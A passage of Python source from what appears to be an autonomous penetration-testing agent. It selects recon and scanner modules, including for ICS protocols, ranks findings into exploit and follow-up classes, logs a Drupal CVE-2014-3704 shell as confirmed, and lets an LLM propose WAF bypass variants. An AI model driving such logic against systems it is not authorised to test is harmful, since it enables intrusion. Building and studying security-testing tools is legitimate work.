                synthesis=synthesis,
                collector=evidence_collector,
                opsec_journal=opsec_journal,
            )
            self._update_knowledge_base_from_results(
                state.knowledge_base,
                results,
                [str(r.get("path", "")) for r in results if isinstance(r, dict)],
                list(state.knowledge_base.get("tech_hints") or []),
                list(state.scan_specializations or []),
                phase="expanded-osint",
            )
        return results

    def _filter_modules_by_protocol(self, modules, protocol):
        protocol = str(protocol or "").strip().lower()
        if not protocol:
            return modules
        if protocol == "ics":
            filtered = []
            for module in modules:
                path = module_path_lower(module)
                if "/ics/" in path or "ics" in str(module.get("tags") or "").lower():
                    filtered.append(module)
            return filtered
        pfx_scanner = f"scanner/{protocol}/"
        pfx_aux = f"auxiliary/scanner/{protocol}/"
        filtered = []
        for module in modules:
            path = module_path_lower(module)
            if pfx_scanner in path or pfx_aux in path:
                filtered.append(module)
        return filtered

    def _port_to_protocol(self, port):
        mapping = {
            80: "http", 443: "http", 8080: "http", 8443: "http",
            21: "ftp", 22: "ssh", 23: "telnet", 389: "ldap", 636: "ldap",
            445: "smb", 139: "smb", 3306: "mysql", 5432: "postgresql",
            102: "ics", 502: "ics", 44818: "ics", 20000: "ics",
            2404: "ics", 47808: "ics", 4840: "ics", 111: "ics", 8000: "ics",
        }
        return mapping.get(int(port))

    def _pick_recon_modules(self, modules, state: Optional[AgentState] = None):
        recon = []
        cms_detect_tokens = ("wordpress_detect", "drupal_detect", "joomla_detect")
        expanded = bool(state and getattr(state, "expanded_surface", False))
        for module in modules:
            path = module_path_lower(module)
            blob = module_blob_lower(module)
            is_surface_recon = False
            if expanded and self._is_expanded_surface_module_path(path):
                if not any(skip in path for skip in EXPANDED_SURFACE_RECON_SKIP_SUBSTR):
                    is_surface_recon = True
            # Keep recon lightweight: favor detection/fingerprint modules, avoid heavy vuln scanners.
            is_light_detect = (
                path.startswith("scanner/http/")
                and any(token in path for token in ("_detect", "server_banner", "robots_txt", "security_headers"))
                and "http_methods_detect" not in path
            )
            is_auth_recon = any(token in path for token in ("login_page_detector", "simple_login_scanner"))
            is_discovery_aux = any(token in blob for token in ("robots", "swagger", "graphql"))
            is_heavy_scanner = (
                path.startswith("auxiliary/scanner/")
                and any(token in path for token in ("wordpress_scanner", "drupal_scanner", "joomla_scanner"))
            )
            if (is_light_detect or is_discovery_aux or is_auth_recon or is_surface_recon) and not is_heavy_scanner:
                recon.append(module)
        # Favor quick CMS detectors first so campaign pivots earlier; then expanded-surface modules.
        recon.sort(
            key=lambda m: (
                0 if any(t in module_path_lower(m) for t in cms_detect_tokens) else 1,
                0 if (
                    expanded
                    and self._is_expanded_surface_module_path(str(m.get("path", "")))
                ) else 1,
                str(m.get("path", "")),
            )
        )
        return recon

    def _pick_cms_detector_modules(self, modules):
        picked = []
        wanted = ("wordpress_detect", "drupal_detect", "joomla_detect")
        for module in modules:
            path = module_path_lower(module)
            if any(token in path for token in wanted):
                picked.append(module)
        return picked

    def _extract_tech_hints(self, recon_results):
        hints = set()
        hint_words = [
            "dvwa", "wordpress", "drupal", "joomla", "grafana", "jenkins", "elasticsearch",
            "kibana", "tomcat", "nginx", "apache", "phpmyadmin", "docker", "cloud",
            "api", "swagger", "fastapi", "django", "flask", "nodejs", "nextjs",
            "react", "angular", "php", "python", "java",
            "modbus", "s7comm", "siemens", "bacnet", "iec104", "enip", "dnp3",
            "opcua", "scada", "plc", "ics", "ot",
        ]
        for result in recon_results:
            if not self._result_indicates_positive_detection(result):
                continue
            if not self._result_has_explicit_evidence(result):
                continue
            blob = self._result_evidence_blob(result)
            for word in hint_words:
                if word in blob:
                    hints.add(word)
        return hints

    def _rank_targeted_modules(self, modules, tech_hints, max_modules, specializations=None, knowledge_base=None):
        """
        Deterministic targeted ranking using technology hints + generic web safety checks.
        """
        generic_web_keywords = (
            "sql", "xss", "lfi", "rfi", "ssrf", "cors", "csrf", "headers", "directory_listing",
            "debug", "injection", "wordpress_scanner", "drupal_scanner", "joomla_scanner",
        )
        core_capability_keywords = (
            "crawler", "crawl", "spider", "fuzzer", "fuzz", "sqli", "sqli_engine", "sql_injection",
            "xss_scanner", "lfi_fuzzer", "ssrf_scanner", "wordpress_scanner",
            "http_smuggling", "debug_info_leak", "archives",
            "sensitive_files", "security_headers",
        )
        generic_rules = [(2, generic_web_keywords)]
        core_rules = [(3, core_capability_keywords)]
        detect_fingerprint_rules = [(1, ("detect", "fingerprint"))]

        normalized_specializations = set([str(x).lower() for x in (specializations or [])])
        cms_specializations = normalized_specializations.intersection(set(CMS_LOCK_NAMES))
        if not cms_specializations:
            tech_set = set([str(h).lower() for h in tech_hints or []])
            cms_specializations = tech_set.intersection(set(CMS_LOCK_NAMES))

        cms_focus_tokens = {
            "wordpress": (
                "wordpress", "wp_", "wp-", "wp/plugin", "wp_plugin", "wpvivid",
                "wordpress_enum_user", "wordpress_detect",
            ),
            "drupal": ("drupal", "drupal_scanner", "drupal_detect"),
            "joomla": ("joomla", "joomla_scanner", "joomla_detect"),
        }
        cms_tokens = set()
        for cms in cms_specializations:
            for token in cms_focus_tokens.get(cms, ()):
                cms_tokens.add(token)
        strong_wordpress = self._has_tech_evidence(knowledge_base or {}, "wordpress", threshold=0.8)

        ranked = []
        tech_hints_seq = list(tech_hints or [])
        fuzz_penalty_tokens = ("xss", "sqli_engine", "sql_injection", "sqli", "lfi", "ssrf", "fuzzer")
        for idx, module in enumerate(modules):
            path = module_path_lower(module)
            blob = module_blob_lower(module)
            if "wordpress_madara" in blob and not strong_wordpress:
                continue
            if not strong_wordpress and ("wp_plugin_exclusive" in path or "wp_plugin_exclusive" in blob):
                continue

            score = score_tech_hints_in_blob(blob, tech_hints_seq, weight=4)
            score += score_rules(blob, generic_rules)
            score += score_rules(blob, core_rules)
            score += score_rules(blob, detect_fingerprint_rules)

            kb = knowledge_base or {}
            if isinstance(kb, dict) and kb.get("expanded_surface"):
                if self._is_expanded_surface_module_path(path):
                    score += 2

            if cms_tokens:
                is_cms_module = any(token in blob for token in cms_tokens)
                # In CMS lock mode, strongly prioritize CMS-centric modules and
                # penalize generic fuzzers that create noisy request floods.
                if is_cms_module:
                    score += 8
                elif any(token in blob for token in fuzz_penalty_tokens):
                    score -= 6

            ranked.append((score, -idx, module))

        ranked.sort(reverse=True)
        selected = []
        selected_paths = set()

        # Always seed with a compact baseline of high-value modules.
        baseline = self._select_baseline_modules(modules, cms_specializations)
        for module in baseline:
            path = module.get("path")
            if path and path not in selected_paths:
                selected.append(module)
                selected_paths.add(path)
            if len(selected) >= max_modules:
                return selected

        for score, _, module in ranked:
            if len(selected) >= max_modules:
                break
            if score <= 0 and selected:
                continue
            path = module.get("path")
            if path and path in selected_paths:
                continue
            selected.append(module)
            if path:
                selected_paths.add(path)

        # Ensure non-empty selection.
        if not selected:
            selected = modules[:max_modules]
        return selected

    def _select_baseline_modules(self, modules, cms_specializations=None):
        """
        Baseline modules to keep framework coverage broad but bounded.
        """
        cms_specializations = set([str(x).lower() for x in (cms_specializations or [])])
        if cms_specializations:
            wanted_tokens = [
                "scanner/http/security_headers",
                "scanner/http/sensitive_files",
            ]
            if "wordpress" in cms_specializations:
                wanted_tokens.extend([
                    "scanner/http/wordpress_detect",
                    "auxiliary/scanner/http/wp_plugin_scanner",
                    "auxiliary/scanner/http/wordpress_enum_user",
                ])
            if "drupal" in cms_specializations:
                wanted_tokens.extend([
                    "scanner/http/drupal_detect",
                    "auxiliary/scanner/http/drupal_scanner",
                ])
            if "joomla" in cms_specializations:
                wanted_tokens.extend([
                    "scanner/http/joomla_detect",
                    "auxiliary/scanner/http/joomla_scanner",
                ])
        else:
            wanted_tokens = [
                "auxiliary/scanner/http/crawler",
                HTTP_SQLI_SCANNER_MODULE,
                "auxiliary/scanner/http/xss_scanner",
                "auxiliary/scanner/http/lfi_fuzzer",
                "auxiliary/scanner/http/ssrf_scanner",
                "scanner/http/security_headers",
                "scanner/http/sensitive_files",
            ]

        selected = []
        for token in wanted_tokens:
            for module in modules:
                if token in module_path_lower(module):
                    selected.append(module)
                    break
        return selected

    def _node_analyze(self, state: AgentState) -> AgentState:
        state.metrics.deterministic_steps += 1
        if state.target_reachable is False and not self._has_proxy_request_intel(state):
            print_warning(f"Analysis skipped: {state.reachability_reason or 'target unreachable'}")
            return state
        vulnerable_results = state.vulnerable_results
        knowledge_base = state.knowledge_base
        sql_findings = []
        for item in vulnerable_results:
            text_blob = " ".join([
                str(item.get("module", "")),
                str(item.get("path", "")),
                str(item.get("message", "")),
            ]).lower()
            if (
                ("sql" in text_blob and "injection" in text_blob)
                or "sqli" in text_blob
                or "sql_injection" in text_blob
            ):
                sql_findings.append(item)
        state.sql_findings = sql_findings
        if sql_findings:
            signals = list(knowledge_base.get("risk_signals", []) or [])
            signal_set = {str(s).lower() for s in signals}
            if "sql_signal" not in signal_set:
                signals.append("sql_signal")
            if "sqli_confirmed" not in signal_set and any(
                item.get("vulnerable")
                or str(item.get("severity", "")).lower() in {"critical", "high", "medium"}
                for item in sql_findings
                if isinstance(item, dict)
            ):
                signals.append("sqli_confirmed")
            knowledge_base["risk_signals"] = signals
            sync_branches_from_kb_signals(knowledge_base)
            state.knowledge_base = knowledge_base
        state.contextual_findings = self._deduplicate_findings(
            self._build_contextual_findings(vulnerable_results, knowledge_base)
        )
        if getattr(state, "refute_panel", False):
            state.contextual_findings = self._apply_refutation_panel(state, state.contextual_findings)
        knowledge_base["campaign_findings_snapshot"] = [
            {
                "path": item.get("path"),
                "message": item.get("message"),
                "module": item.get("module"),
                "context_hints": list(item.get("context_hints", []) or [])[:6],
                "evidence_state": item.get("evidence_state"),
                "proof_quality": item.get("proof_quality"),
            }
            for item in (state.contextual_findings or [])[:40]
            if isinstance(item, dict)
        ]
        invalidate_playbook_planner_cache(knowledge_base)
        state.potential_findings = self._deduplicate_findings(
            self._identify_potential_findings(vulnerable_results)
        )
        if state.verbose:
            print_info(
                "Context snapshot: "
                f"{len(knowledge_base.get('discovered_endpoints', []))} endpoints, "
                f"{len(knowledge_base.get('discovered_params', []))} params, "
                f"{len(knowledge_base.get('tech_hints', []))} tech hints, "
                f"{len(knowledge_base.get('login_paths', []))} login paths"
            )

        self._print_detection_summary(state)

        exploit_count = len([f for f in state.contextual_findings if f.get("decision_class") == "exploit"])
        followup_count = len([f for f in state.contextual_findings if f.get("decision_class") == "followup"])
        info_count = len([f for f in state.contextual_findings if f.get("decision_class") == "info"])

        if sql_findings:
            print_success(f"High-priority detection: SQL injection ({len(sql_findings)})")
        elif exploit_count:
            print_success(f"Exploitable findings detected: {exploit_count}")
        elif followup_count:
            print_warning(
                f"No direct exploit path yet. Follow-up investigation required on {followup_count} finding(s)."
            )
        elif vulnerable_results:
            print_warning(
                f"Only informational findings detected ({info_count or len(vulnerable_results)}). "
                "No direct exploitation candidate."
            )
        else:
            print_warning("No obvious vulnerabilities found")
        self._append_timeline_event(
            state,
            "analyze",
            (
                f"Analysis classified findings: exploit={exploit_count}, "
                f"followup={followup_count}, info={info_count}."
            ),
            kind="analysis",
            results=state.contextual_findings,
        )
        return state

    def _record_exploit_confirmed_finding(
        self,
        state: Optional[AgentState],
        exploit_path: str,
        *,
        session_ids: Optional[List[str]] = None,
    ) -> None:
        """Preserve the vulnerability finding when an exploit path directly yields a shell."""
        if not isinstance(state, AgentState):
            return
        path = str(exploit_path or "").strip()
        low = path.lower()
        if not path:
            return

        finding: Optional[Dict[str, Any]] = None
        if "drupal_cve_2014_3704_sqli" in low:
            finding = {
                "module": "Drupal 7.x SQLi RCE (CVE-2014-3704)",
                "path": path,
                "status": "vulnerable",
                "vulnerable": True,
                "severity": "critical",
                "confidence": "high",
                "message": "Critical SQL injection confirmed: Drupal SA-CORE-2014-005 / CVE-2014-3704",
                "exploit_module": path,
                "evidence_state": "exploitable",
                "proof": "Exploit produced a shell session",
                "details": {
                    "cve": "CVE-2014-3704",
                    "class": "sql_injection",
                    "sqli_confirmed": True,
                    "session_ids": list(session_ids or []),
                },
            }

        if not finding:
            return

        existing_keys = {
            (str(row.get("path") or ""), str(row.get("message") or ""))
            for row in (state.results or [])
            if isinstance(row, dict)
        }
        key = (str(finding.get("path") or ""), str(finding.get("message") or ""))
        if key not in existing_keys:
            state.results.append(finding)

        state.vulnerable_results = self._deduplicate_findings(
            [
                row for row in (state.vulnerable_results or []) + [finding]
                if isinstance(row, dict) and self._is_actionable_finding(row)
            ]
        )
        state.contextual_findings = self._deduplicate_findings(
            self._build_contextual_findings(state.vulnerable_results, state.knowledge_base)
        )

        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        signals = list(kb.get("risk_signals", []) or [])
        signal_set = {str(s).lower() for s in signals}
        for signal in (
            "sql_signal",
            "sqli_confirmed",
            "vulnerability_detected",
            "shell_obtained",
            "interactive_shell",
        ):
            if signal not in signal_set:
                signals.append(signal)
                signal_set.add(signal)
        kb["risk_signals"] = signals
        state.knowledge_base = kb
        state.sql_findings = self._deduplicate_findings(list(state.sql_findings or []) + [finding])
        print_success("High-priority detection: critical SQL injection confirmed (Drupal CVE-2014-3704)")

    def _identify_potential_findings(self, vulnerable_results):
        potential = []
        for finding in vulnerable_results:
            msg = str(finding.get("message", "")).lower()
            sev = str(finding.get("severity", "")).lower()
            if any(token in msg for token in ("potential", "possible", "manual verification")):
                potential.append(finding)
                continue
            if sev in ("info", "low") and not finding.get("exploit_module"):
                potential.append(finding)
        return potential

    def _build_contextual_findings(self, vulnerable_results, knowledge_base):
        contextual = []
        hints = set(knowledge_base.get("tech_hints", []))
        risk_signals = set(knowledge_base.get("risk_signals", []))
        endpoint_count = len(knowledge_base.get("discovered_endpoints", []))
        param_count = len(knowledge_base.get("discovered_params", []))
        history_scores = self._report.load_history_scores()

        severity_weight = {"critical": 5, "high": 4, "medium": 3, "low": 2, "info": 1}
        for item in vulnerable_results:
            item = attach_result_evidence(item)
            item = apply_evidence_gate(item)
            path = str(item.get("path", "")).lower()
            message = str(item.get("message", "")).lower()
            severity = str(item.get("severity", "")).lower()
            exploit_path = self._catalog.normalize_exploit_module_path(item.get("exploit_module"))

            matching_hints = [h for h in hints if h and (h in path or h in message)]
            impact = float(severity_weight.get(severity, 2))
            if any(token in message for token in ("rce", "command execution", "admin", "auth bypass")):
                impact += 1.0
            if self._catalog.is_pure_technology_detection_module(path, message):
                impact -= 0.8

            exploitability = 1.2 if exploit_path else 0.8
            if self._catalog.normalize_linked_module_paths(item.get("linked_modules")):
                exploitability += 0.35
            if any(token in path for token in ("sql", "xss", "lfi", "ssrf")):
                exploitability += 0.2
            if any(token in path for token in (
                "simple_login_scanner",
                "login_page_detector",
                "admin_panel_detect",
                "admin_login_bruteforce",
            )):
                exploitability += 0.5

            confidence = 0.9 if item.get("vulnerable") else 0.5
            if matching_hints:
                confidence += 0.2
            evidence_state = str(item.get("evidence_state", "") or "").lower()
            if evidence_state == "exploitable":
                confidence += 0.18
            elif evidence_state == "confirmed":
                confidence += 0.12
            elif evidence_state == "signal":
                confidence -= 0.12
            proof_quality = item.get("proof_quality") if isinstance(item.get("proof_quality"), dict) else {}
            try:
                if float(proof_quality.get("best_confidence", 0.0) or 0.0) >= 0.75:
                    confidence += 0.06
            except Exception:
                pass
            if "possible" in message or "potential" in message:
                confidence -= 0.2
            if "scanner_errors" in risk_signals and severity in ("low", "info"):
                confidence -= 0.1
            if "login page detected" in message or "login panel" in message:
                confidence += 0.25
            confidence = max(0.3, min(confidence, 1.2))

            evidence_count = 1.0
            details = item.get("details", {}) if isinstance(item, dict) else {}
            if isinstance(details, dict):
                evidence_count += min(len(details), 4) * 0.2
            evidence_count += min(int(proof_quality.get("records", 0) or 0), 4) * 0.18
            evidence_count += min(int(proof_quality.get("independent_sources", 0) or 0), 3) * 0.18
            evidence_count += min(len(matching_hints), 3) * 0.2
            if endpoint_count >= 10:
                evidence_count += 0.2
            if param_count >= 5:
                evidence_count += 0.2

            history = history_scores.get(path, {})
            detections = int(history.get("detections", 0))
            freshness = max(0.5, 1.0 - (detections * 0.05))

            false_positive_penalty = self._estimate_false_positive_penalty(path, severity, item, history)
            context_score = (impact * exploitability * confidence * evidence_count * freshness) - false_positive_penalty

            annotated = dict(item)
            annotated["context_score"] = round(context_score, 3)
            annotated["risk_factors"] = {
                "impact": round(impact, 3),
                "exploitability": round(exploitability, 3),
                "confidence": round(confidence, 3),
                "evidence_count": round(evidence_count, 3),
                "freshness": round(freshness, 3),
                "false_positive_penalty": round(false_positive_penalty, 3),
            }
            annotated["context_hints"] = matching_hints
            annotated["validation_status"] = self._finding_validation_status(annotated)
            annotated["decision_class"] = self._finding_decision_class(annotated)
            annotated["importance"] = self._finding_importance_label(annotated)
            contextual.append(annotated)

        contextual.sort(key=lambda row: row.get("context_score", 0), reverse=True)
        return contextual

    def _collect_redirect_observation(self, state: AgentState):
        kb = state.knowledge_base
        fingerprint_trace = kb.get("fingerprint_trace", []) or []
        redirect_paths = []
        root_status = None
        root_location = ""

        for row in fingerprint_trace:
            if not isinstance(row, dict):
                continue
            path = str(row.get("path", ""))
            try:
                status = int(row.get("status", 0) or 0)
            except Exception:
                status = 0
            location = str(row.get("location", "")).strip()

            if path == "/" and status:
                root_status = status
                root_location = location[:200]
            if status in HTTP_REDIRECT_STATUSES:
                redirect_paths.append({
                    "path": path,
                    "status": status,
                    "location": location[:200],
                })

        endpoint_count = len(kb.get("discovered_endpoints", []))
        return {
            "root_status": root_status,
            "root_location": root_location,
            "redirect_count": len(redirect_paths),
            "redirect_paths": redirect_paths[:8],
            "low_discovery": endpoint_count <= 1,
        }

    def _estimate_false_positive_penalty(self, path, severity, item, history):
        likely_false_positives = int(history.get("likely_false_positives", 0))
        penalty = likely_false_positives * 0.15
        if not item.get("exploit_module") and severity in ("low", "info"):
            penalty += 0.2
        if self._catalog.is_pure_technology_detection_module(path, str(item.get("message", ""))):
            penalty += 0.35
        if "possible" in str(item.get("message", "")).lower():
            penalty += 0.1
        return penalty

    def _weaponizable_finding_tokens(self) -> Tuple[str, ...]:
        return (
            "lfi",
            "rfi",
            "sqli",
            "sql_injection",
            "ssrf",
            "xxe",
            "rce",
            "command_injection",
            "file_read",
            "path_traversal",
            "ssti",
            "deserialization",
            "smuggling",
            "auth_bypass",
            "file_upload",
        )

    def _finding_path_has_weaponizable_token(self, finding: Dict[str, Any]) -> bool:
        path = str(finding.get("path", "") or "").lower().replace("-", "_")
        module = str(finding.get("module", "") or "").lower().replace("-", "_")
        message = str(finding.get("message", "") or "").lower()
        tokens = set(self._weaponizable_finding_tokens())
        for raw in (path, module):
            basename = raw.rsplit("/", 1)[-1]
            if basename in tokens:
                return True
            parts = {p for seg in basename.split("_") for p in seg.split(".") if p}
            if parts.intersection(tokens):
                return True
        # Message-level SQL/LFI confirmation (module path may be generic).
        if ("sql" in message and "injection" in message) or " local file inclusion" in f" {message}":
            return True
        if any(f" {tok} " in f" {message} " for tok in ("lfi", "rfi", "ssrf", "xxe", "ssti")):
            return True
        return False

    def _is_weaponizable_vuln_finding(self, finding: Dict[str, Any]) -> bool:
        """
        Confirmed/medium injection-class scanners that should drive follow-up
        even without a linked exploit_module (classic soft targets: LFI/SQLi).
        """
        if not isinstance(finding, dict):
            return False
        if not self._finding_path_has_weaponizable_token(finding):
            return False
        severity = str(finding.get("severity", "") or "").lower()
        if finding.get("vulnerable"):
            return True
        if severity in ("critical", "high", "medium"):
            return True
        message = str(finding.get("message", "") or "").lower()
        # High-priority SQL detection may land before vulnerable=True is set.
        if "sql" in message and "injection" in message:
            return True
        return False

    def _finding_decision_class(self, finding: Dict[str, Any]) -> str:
        if not isinstance(finding, dict):
            return "info"
        path = str(finding.get("path", "")).lower()
        message = str(finding.get("message", "")).lower()
        severity = str(finding.get("severity", "")).lower()
        details = finding.get("details", {}) or {}
        exploit_path = self._catalog.normalize_exploit_module_path(finding.get("exploit_module"))
        validation_status = str(
            finding.get("validation_status")
            or self._finding_validation_status(finding)
        ).lower()

        if exploit_path and validation_status == "exploitable":
            return "exploit"
        if exploit_path:
            return "followup"
        if isinstance(details, dict) and (
            details.get("authenticated_as")
            or details.get("post_login_snippet")
            or details.get("post_login_final_url")
        ):
            return "followup"
        if any(token in path for token in (
            "admin_panel_detect",
            "simple_login_scanner",
            "login_page_detector",
            "admin_login_bruteforce",
        )):
            return "followup"
        if self._is_weaponizable_vuln_finding(finding):
            return "followup"
        if severity in ("critical", "high"):
            return "followup"
        if any(token in message for token in (
            "authenticated as",
            "valid credentials",
            "auth bypass",
            "login page detected",
            "login panel",
        )):
            return "followup"
        return "info"

    def _finding_validation_status(self, finding: Dict[str, Any]) -> str:
        """Classify signal strength before allowing exploitation."""
        if not isinstance(finding, dict):
            return "signal"
        exploit_path = self._catalog.normalize_exploit_module_path(
            finding.get("exploit_module")
        )
        details = finding.get("details") if isinstance(finding.get("details"), dict) else {}
        evidence_state = str(finding.get("evidence_state", "") or "").lower()
        if evidence_state in {"exploitable", "fixed", "regressed"}:
            return evidence_state
        if evidence_state == "confirmed" and exploit_path:
            return "exploitable"
        if evidence_state == "confirmed":
            return "confirmed"
        strong_runtime = bool(
            details.get("authenticated_as")
            or details.get("command_output")
            or details.get("file_read")
            or details.get("reflection_confirmed")
            or details.get("proof")
            or finding.get("session_id")
        )
        explicit = strong_runtime or self._result_has_explicit_evidence(finding)
        if explicit and exploit_path:
            return "exploitable"
        if explicit:
            return "confirmed"
        if finding.get("vulnerable") and (
            str(finding.get("severity", "")).lower() in {"critical", "high", "medium"}
            or float(finding.get("context_score", 0.0) or 0.0) >= 2.0
        ):
            return "probable"
        return "signal"

    def _finding_importance_label(self, finding: Dict[str, Any]) -> str:
        score = float(finding.get("context_score", 0.0) or 0.0)
        decision = str(finding.get("decision_class", self._finding_decision_class(finding)))
        if decision == "exploit":
            return "critical"
        if decision == "followup" and score >= 5.0:
            return "high"
        if decision == "followup":
            return "medium"
        if score >= 3.0:
            return "medium"
        return "low"

    def _shorten_text(self, value: Any, limit: int = 160) -> str:
        text = " ".join(str(value or "").split())
        if len(text) <= limit:
            return text
        return text[: limit - 3].rstrip() + "..."

    def _deduplicate_findings(self, findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Deduplicate repeated findings by vulnerability, host, service and evidence."""
        return deduplicate_scanner_results(findings)

    def _print_detection_summary(self, state: AgentState) -> None:
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        findings = state.contextual_findings or []
        if state.target_reachable is False:
            print_warning(f"Target summary: unreachable ({state.reachability_reason or 'no reason'})")
            return

        tech_hints = self._display_tech_hints(kb)
        login_paths = [str(x) for x in kb.get("login_paths", []) if str(x).strip()]
        endpoints = kb.get("discovered_endpoints", []) or []
        params = kb.get("discovered_params", []) or []
        risk_signals = [
            str(x) for x in kb.get("risk_signals", [])
            if str(x).strip() and str(x).strip().lower() not in {"vulnerability_detected", "scanner_errors"}
        ]
        stack_confidence = self._stack_confidence_rows(kb)
        request_intel = kb.get("request_intel", {}) if isinstance(kb.get("request_intel", {}), dict) else {}

        print_status("Detection summary")
        print_info(
            f"Surface: endpoints={len(endpoints)} params={len(params)} "
            f"tech={len(tech_hints)} login_paths={len(login_paths)}"
        )
        if int(request_intel.get("analyzed_flows", 0) or 0) > 0:
            print_info(
                "HTTP request intel: "
                f"flows={request_intel.get('analyzed_flows', 0)} "
                f"interesting={len(request_intel.get('interesting_requests', []) or [])}"
            )
        if tech_hints:
            print_info(f"Tech hints: {', '.join(tech_hints[:6])}")
        if stack_confidence:
            print_info(
                "Stack confidence: "
                + ", ".join([f"{name}={score:.2f}" for name, score in stack_confidence[:5]])
            )
        if login_paths:
            print_info(f"Login paths: {', '.join(login_paths[:4])}")
        if risk_signals:
            print_info(f"Signals: {', '.join(risk_signals[:6])}")

        if not findings:
            return

        important = [f for f in findings if f.get("importance") in ("critical", "high", "medium")]
        exploit = [f for f in findings if f.get("decision_class") == "exploit"]
        followup = [f for f in findings if f.get("decision_class") == "followup"]
        info_only = [f for f in findings if f.get("decision_class") == "info"]
        print_info(
            f"Decision buckets: exploit={len(exploit)} "
            f"followup={len(followup)} info={len(info_only)}"
        )

        deduped_findings = self._deduplicate_findings(findings)
        top_source = [f for f in deduped_findings if f.get("importance") in ("critical", "high", "medium")]
        top_rows = top_source[:5] if top_source else deduped_findings[:5]
        print_status("Important findings")
        for row in top_rows:
            badge = str(row.get("decision_class", "info")).upper()
            importance = str(row.get("importance", "low")).upper()
            path = str(row.get("path", "")).strip()
            message = self._shorten_text(row.get("message", ""), 145)
            score = float(row.get("context_score", 0.0) or 0.0)
            print_info(f"[{importance}/{badge}] {path} | score={score:.2f}")
            if message:
                print_info(f"  -> {message}")

    def _print_decision_summary(self, state: AgentState) -> None:
        plan = state.execution_plan or {}
        llm_plan = state.llm_plan or {}
        source = "LLM" if state.decision_source == "llm_local" else "Heuristic"
        print_status("Decision summary")
        print_info(f"Source: {source}")
        if state.campaign_goal:
            print_info(f"Goal: {state.campaign_goal}")

        nba = llm_plan.get("next_best_action")
        if isinstance(nba, dict) and nba.get("type"):
            nba_score = nba.get("decision_score")
            nba_conf = nba.get("confidence")
            score_suffix = ""
            if nba_score is not None or nba_conf is not None:
                score_suffix = (
                    f" | score={float(nba_score or 0.0):.2f}"
                    f" conf={float(nba_conf or 0.0):.2f}"
                )
            print_info(
                f"Next action: {nba.get('type')} {nba.get('path', '')} "
                f"| {self._shorten_text(nba.get('reason', ''), 120)}{score_suffix}"
            )

        actions = [a for a in (plan.get("next_actions") or []) if isinstance(a, dict)]
        run_actions = [
            a for a in actions
            if str(a.get("type", "")).lower() in ("run_followup", "run_exploit")
        ][:4]
        if run_actions:
            print_info("Planned actions:")
            for row in run_actions:
                explanation = row.get("decision_explanation", {})
                reason = (
                    explanation.get("reason")
                    if isinstance(explanation, dict)
                    else ""
                ) or self._action_reason_for_path(
                    str(row.get("path", "") or ""),
                    state,
                    state.contextual_findings or state.vulnerable_results,
                )
                score = row.get("decision_score")
                confidence = row.get("confidence")
                score_suffix = ""
                if score is not None or confidence is not None:
                    score_suffix = f" score={float(score or 0.0):.2f} conf={float(confidence or 0.0):.2f}"
                print_info(f"- {row.get('type')} {row.get('path', '')}")
                print_info(f"  because: {self._shorten_text(reason, 120)}{score_suffix}")
                if isinstance(explanation, dict):
                    evidence = explanation.get("evidence", []) or []
                    if evidence:
                        print_info(f"  evidence: {self._shorten_text('; '.join(evidence[:3]), 140)}")
                    rejected = explanation.get("rejected_alternatives", []) or []
                    if rejected:
                        alt = rejected[0]
                        print_info(
                            f"  not {str(alt.get('path', '?')).split('/')[-1]}: "
                            f"{self._shorten_text(str(alt.get('reason', '')), 100)}"
                        )
                    pivot = str(explanation.get("next_pivot", "") or "")
                    if pivot:
                        print_info(f"  next pivot: {pivot.split('/')[-1]}")
                    risk = explanation.get("risk", {}) if isinstance(explanation.get("risk"), dict) else {}
                    if risk.get("level"):
                        print_info(f"  risk: {risk.get('level')} (cost={risk.get('cost', '?')})")

        rationale = llm_plan.get("rationale")
        if rationale:
            print_info(f"Rationale: {self._shorten_text(rationale, 180)}")

    def _refresh_compressed_context_summary(self, state: AgentState) -> str:
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        timeline = state.decision_timeline if isinstance(state.decision_timeline, list) else []
        findings = state.vulnerable_results or state.contextual_findings or []
        top_findings = []
        for item in findings[:8]:
            if not isinstance(item, dict):
                continue
            top_findings.append(
                f"{item.get('path', '')}: {self._shorten_text(item.get('message', ''), 90)}"
            )
        recent_events = []
        for row in timeline[-8:]:
            if isinstance(row, dict):
                recent_events.append(
                    f"{row.get('phase', '?')}: {self._shorten_text(row.get('summary', ''), 100)}"
                )
        request_intel = kb.get("request_intel", {}) if isinstance(kb.get("request_intel", {}), dict) else {}
        summary = {
            "goal": state.campaign_goal,
            "stop_reason": state.campaign_stop_reason,
            "tech": kb.get("tech_hints", [])[:12],
            "risk": kb.get("risk_signals", [])[:12],
            "login_paths": kb.get("login_paths", [])[:6],
            "endpoints": len(kb.get("discovered_endpoints", []) or []),
            "params": len(kb.get("discovered_params", []) or []),
            "request_intel": {
                "flows": request_intel.get("analyzed_flows", 0),
                "interesting": len(request_intel.get("interesting_requests", []) or []),
                "top_requests": [
                    f"{row.get('method')} {row.get('path')}"
                    for row in (request_intel.get("interesting_requests", []) or [])[:5]
                    if isinstance(row, dict)
                ],
            } if request_intel else {},
            "top_findings": top_findings,
            "recent_events": recent_events,
        }
        state.compressed_context_summary = self._shorten_text(json.dumps(summary, ensure_ascii=False), 3000)
        return state.compressed_context_summary

    def _node_reason(self, state: AgentState) -> AgentState:
        if state.replan_pending and state.replan_count < 1:
            state.replan_count += 1
            state.replan_pending = False
        if state.target_reachable is False and not self._has_proxy_request_intel(state):
            state.metrics.deterministic_steps += 1
            state.decision_source = "heuristic"
            return state
        vulnerable_results = state.vulnerable_results
        contextual_findings = state.contextual_findings
        decision_findings = contextual_findings if contextual_findings else vulnerable_results
        knowledge_base = state.knowledge_base
        self._sync_campaign_goal(state)
        if state.verbose and state.campaign_goal:
            print_info(f"Campaign goal: {state.campaign_goal}")

        if state.campaign_stop_reason and "blocking/WAF" in str(state.campaign_stop_reason):
            if approved_to_continue_through_waf(state):
                state.campaign_stop_reason = None
            elif getattr(state, "llm_local", False):
                print_info("WAF/blocking detected — strategic LLM may propose bypass variants.")
                state.campaign_stop_reason = None
            else:
                state.llm_plan = {
                    "selected_paths": [],
                    "rationale": state.campaign_stop_reason,
                    "next_best_action": {"type": "skip", "path": "", "reason": state.campaign_stop_reason},
                }
                state.execution_plan = {
                    "next_actions": [],
                    "max_requests_next_phase": 0,
                    "stop_conditions": ["waf_or_blocking_detected"],
                    "reasoning_confidence": 1.0,
                    "skip_exploitation": True,
                    "campaign_goal": state.campaign_goal,
                }
